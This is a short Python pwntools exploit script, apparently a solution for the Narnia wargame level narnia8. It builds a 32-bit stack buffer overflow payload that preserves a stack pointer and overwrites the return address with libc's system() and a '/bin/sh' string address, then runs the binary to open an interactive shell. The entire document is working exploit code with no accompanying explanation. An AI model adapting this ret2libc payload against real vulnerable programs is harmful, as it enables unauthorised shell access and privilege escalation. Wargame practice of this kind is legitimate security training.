from pwn import *

libc_base = 0xf7e12000
system = 0x3a850
binsh = 0x15ccc8

payload = b'A'*20
payload += p32(0xffffd868) # this is blah's address (see the code) - needs to be preserved in the overwrite. it decreases based on total length of the payload
payload += b'BBBB'
payload += p32(libc_base + system)
payload += b'CCCC' # return address - doesnt matter
payload += p32(libc_base + binsh)

p = process(['/narnia/narnia8', payload])
p.interactive()